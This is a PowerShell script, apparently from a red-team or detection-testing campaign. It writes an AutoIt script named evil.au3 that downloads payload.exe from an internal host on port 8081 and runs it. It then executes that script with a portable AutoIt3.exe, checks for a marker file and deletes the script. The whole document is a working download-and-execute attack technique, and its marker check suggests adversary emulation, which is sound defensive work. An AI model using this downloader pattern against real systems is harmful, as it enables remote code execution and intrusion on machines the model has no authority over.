# CADRE — WT067 — AutoIt3 Execution (REAL, 2026-08-03)
# Uses the portable AutoIt3.exe (staged in C:\Tools\campaign-h\www) to run an .au3
# downloader that fetches payload.exe from provisioning :8081 and executes it.
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'
$ai = "$www\AutoIt3.exe"

if (-not (Test-Path $ai)) { Write-Output 'AUTOIT_MISSING'; exit 1 }

Write-Output '=== 1. Write evil.au3 ==='
$au3 = @'
Local $sUrl = "http://192.168.77.60:8081/payload.exe"
Local $sLocal = @TempDir & "\payload.exe"
Local $sMarker = "C:\Windows\Temp\H-PAYLOAD-MARKER.txt"
InetGet($sUrl, $sLocal)
If FileExists($sLocal) Then
    Run($sLocal)
    Sleep(5000)
    If FileExists($sMarker) Then ConsoleWrite("AUTOIT_MARKER_HIT" & @CRLF)
Else
    ConsoleWrite("AUTOIT_DOWNLOAD_FAIL" & @CRLF)
EndIf
'@
Set-Content -Path "$www\H-05-evil.au3" -Value $au3 -Encoding ASCII
Write-Output 'AU3_WRITTEN'

Write-Output '=== 2. Run AutoIt3 ==='
Remove-Item 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' -ErrorAction SilentlyContinue
& $ai "$www\H-05-evil.au3" 2>&1 | Select-Object -First 5 | ForEach-Object { Write-Output "AUTOIT|$_" }
Start-Sleep -Seconds 6
Write-Output "MARKER_HIT $(Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt')"
if (Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt') { Get-Content 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' }

Write-Output '=== 3. Cleanup ==='
Remove-Item "$www\H-05-evil.au3" -ErrorAction SilentlyContinue
Write-Output 'WT067_DONE'
